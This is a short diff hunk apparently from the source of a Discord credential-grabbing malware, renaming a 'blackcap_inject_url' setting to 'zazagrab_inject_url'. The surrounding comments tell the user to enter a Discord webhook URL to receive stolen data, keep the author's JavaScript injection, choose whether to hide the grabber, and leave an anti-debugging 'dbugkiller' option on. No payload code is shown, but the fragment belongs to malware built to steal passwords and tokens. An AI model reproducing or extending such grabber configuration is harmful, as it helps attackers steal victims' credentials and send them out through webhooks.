@@ -42,7 +42,7 @@ Passw = [];
 
 # `
 #    "yourwebhookurl" = your discord webhook url
-#    "blackcap_inject_url" = my javascript injection (i recommand to not change)
+#    "zazagrab_inject_url" = my javascript injection (i recommand to not change)
 #    "hide" = you want to hide grabber? ('yes' or 'no')
 #    "dbugkiller" = recommand to let this
 #    "blprggg" = don't touch at this
